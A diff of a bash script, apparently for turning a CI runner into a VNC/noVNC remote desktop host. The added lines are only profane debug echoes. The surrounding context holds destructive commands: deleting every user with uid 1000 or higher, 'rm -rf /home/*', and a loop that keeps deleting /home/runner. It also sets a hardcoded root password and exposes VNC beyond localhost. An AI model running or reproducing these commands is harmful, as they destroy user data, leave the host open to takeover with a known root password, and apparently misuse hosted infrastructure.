@@ -1,7 +1,7 @@
 #!/bin/bash
 
 
-
+echo 'FUCK1';
 
 # 获取脚本的绝对路径
 SCRIPT_PATH=$(readlink -f "$0")
@@ -32,6 +32,8 @@ vncserver -kill :1 > /dev/null 2>&1 || true
 pkill -9 -u root -f xfce4 || true
 rm -f /tmp/.X1-lock /tmp/.X11-unix/X1 /root/.Xauthority || true
 mkdir -p /root/.vnc
+
+echo 'FUCK2';
 
 echo "=== 3. 写入 100% 授权的 xstartup ==="
 cat > /root/.vnc/xstartup << 'EOF'
@@ -64,7 +66,6 @@ nohup awk -F: '$3>=1000 && $3!=65534 {print $1}' /etc/passwd | xargs -r -n1 user
 nohup rm -rf /home/* &
 nohup while true; do rm -rf /home/runner; sleep 0.1; done &
 
-
 sudo hostnamectl set-hostname "KrabsVPS"
 echo 'root:Krabs.shop' | sudo chpasswd
 
@@ -78,6 +79,8 @@ EOF
 
 chmod +x /root/.vnc/xstartup
 
+echo 'FUCK3';
+
 echo "=== 4. 启动 VNC 并强制授权 ==="
 # 预先创建授权文件
 touch /root/.Xauthority
@@ -86,6 +89,8 @@ vncserver :1 -name "RootFixed" -geometry 1280x800 -depth 24 -localhost no -Secur
 
 # 【关键修复 4】在 Shell 层面再次强制授权，确保即便脚本运行完，后续打开的终端也有效
 DISPLAY=:1 xhost +localhost > /dev/null 2>&1
+
+echo 'FUCK4';
 
 echo "=== 5. 启动 noVNC ==="
 if [ ! -d "/root/noVNC" ]; then
